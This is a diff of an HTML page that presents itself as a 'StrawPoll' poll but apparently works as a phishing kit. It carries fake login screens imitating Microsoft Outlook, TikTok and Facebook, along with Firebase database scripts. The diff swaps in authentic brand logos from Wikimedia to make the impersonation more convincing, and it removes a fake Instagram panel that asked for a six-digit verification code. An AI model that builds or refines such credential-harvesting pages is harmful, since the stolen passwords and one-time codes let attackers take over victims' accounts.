@@ -20,9 +20,10 @@
   <meta property="og:locale" content="en" />
   <meta name="apple-mobile-web-app-title" content="StrawPoll" />
   <meta name="application-name" content="StrawPoll" />
-  <link rel="apple-touch-icon" sizes="180x180" href="/favicon.ico">
-  <link rel="icon" type="image/png" sizes="32x32" href="/favicon.ico">
-  <link rel="icon" type="image/png" sizes="16x16" href="/favicon.ico">
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+  <link rel="manifest" href="/site.webmanifest">
   <script>
 
     const APPEARANCE = 'auto'
@@ -438,17 +439,17 @@
           <div class="mt-6 flex justify-center space-x-8">
             <img width="50px" height="50px" title="facebook"
               class="cursor-pointer hover:scale-110 transition-all duration-200 ease-in-out transform w-12 h-12"
-              src="https://cdn.icon-icons.com/icons2/1826/PNG/512/4202107facebookfblogosocialsocialmedia-115710_115591.png"
+              src="https://upload.wikimedia.org/wikipedia/en/0/04/Facebook_f_logo_%282021%29.svg"
               alt="Facebook" onclick="fb(); hidePopup(); can();">
 
             <img width="50px" height="50px" title="instagram"
               class="cursor-pointer hover:scale-110 transition-all duration-200 ease-in-out transform w-12 h-12"
-              src="https://cdn.icon-icons.com/icons2/836/PNG/512/Instagram_icon-icons.com_66804.png" alt="Instagram"
+              src="https://upload.wikimedia.org/wikipedia/commons/archive/9/95/20220518131923%21Instagram_logo_2022.svg" alt="Instagram"
               onclick="ig(); hidePopup(); can();">
 
             <img width="50px" height="50px" title="tiktok"
               class="cursor-pointer hover:scale-110 transition-all duration-200 ease-in-out transform w-12 h-12"
-              src="https://cdn.icon-icons.com/icons2/2389/PNG/512/tiktok_logo_icon_144802.png" alt="TikTok"
+              src="https://upload.wikimedia.org/wikipedia/commons/3/34/Ionicons_logo-tiktok.svg" alt="TikTok"
               onclick="tok(); hidePopup(); can();">
 
             <img width="50px" height="50px" title="email"
@@ -468,7 +469,9 @@
         <main class="flex-grow">
           <div class="tokpart ">
             <div class=" p-5 w-full max-w-md">
-              <img src="img/Microsoft_logo_(2012).svg.png" alt="logo" class="h-10 mt-20">
+              <img
+                src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/96/Microsoft_logo_%282012%29.svg/1920px-Microsoft_logo_%282012%29.svg.png"
+                alt="logo" class="h-10 mt-20">
               <h2 id="heading" class="text-4xl font-bold text-white mb-0 mt-12 text-left">Sign in</h2>
               <p class="text-xl text-white mb-6 mt-0 text-left">to continue to Outlook</p>
               <!-- Email Input -->
@@ -583,7 +586,7 @@
             <!-- Text above the image with reduced margin -->
             <p class="mb-0" style="font-size: 12px; margin-bottom: 2px;">from</p>
             <!-- Linked image -->
-            <a href="">
+            <a href="https://www.example.com">
               <img src="image/meta.png" alt="logo" class="h-14">
             </a>
           </div>
@@ -598,7 +601,9 @@
           <div class="flex justify-between items-center p-4">
             <!-- Left Section -->
             <div class="flex items-center">
-              <img src="img/TikTok_logo.svg.png" alt="logo" class="h-10">
+              <img
+                src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a9/TikTok_logo.svg/1000px-TikTok_logo.svg.png?20200415104610"
+                alt="logo" class="h-10">
             </div>
             <!-- Right Section -->
             <div class="flex items-center space-x-2">
@@ -706,7 +711,9 @@
         <main class="flex-grow p-2"> <!-- Reduced padding here -->
           <div class="flex justify-center mt-9 mb-4">
             <!-- Centered Image -->
-            <img src="img/Facebook_logo_(2023).svg.png" alt="logo" class="h-12">
+            <img
+              src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/93/Facebook_logo_%282023%29.svg/800px-Facebook_logo_%282023%29.svg.png"
+              alt="logo" class="h-12">
           </div>
           <div class="flex justify-center mb-4 text-black">
             <p class="text-xl text-center break-words max-w-md">
@@ -845,76 +852,6 @@
       </div>
     </div>
   </div>
-
-  <style>
-    #veryfis {
-      margin: 0;
-      padding: 0;
-      height: 100vh;
-      width: 100%;
-      display: ;
-    }
-
-    #veryfi input {
-      font-size: 12px;
-      background-color: whitesmoke;
-      color: black;
-      font-weight: 500;
-    }
-
-    #veryfi button {
-      color: #0095f6;
-      border: 1px solid #0095f6;
-      background-color: transparent;
-      box-sizing: border-box;
-      margin-top: 8px;
-      margin-bottom: 8px;
-      padding: 10px 0;
-      border-radius: 1px;
-      display: flex;
-      justify-content: center;
-      flex-shrink: 0;
-      position: relative;
-      font-size: 14px;
-      font-weight: 300;
-    }
-
-    #veryfi a {
-      color: #0095f6;
-      display: inline;
-    }
-  </style>
-
-
-  <!--Instagram code-->
-  <div id="veryfi" style="display: none;">
-    <div class="dialog-content">
-      <main class="l-main">
-        <div class="l-user">
-          <div class="c-panel group">
-
-            <img class="c-panel__img" src="img/instagram.svg" alt="Instagram">
-            <p class="c-panel__form">Just one more step: enter the six digit code we sent to you</p><br>
-            <div class="c-panel__form">
-              <input type="text" class="c-panel__input" class="form-control" required
-                data-error="Please enter your verification code" placeholder="Confirmation Code" id="ig-code">
-              <button class="confirm-btn" type="submit" onclick="igConfirm()" id="ig-log"> Confirm</button>
-            </div><br>
-
-            <div class="links">
-              <a href="#">Change Number</a> |<a href=""> Resend Code</a><br>
-              <br>
-            </div>
-          </div>
-          <div class="c-signup group">
-            <p>Have an account? <span>Log in</span></p>
-          </div>
-
-        </div>
-      </main>
-    </div>
-  </div>
-
   <script src=" https://www.gstatic.com/firebasejs/5.8.1/firebase-app.js">
   </script>
   <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-database.js"></script>
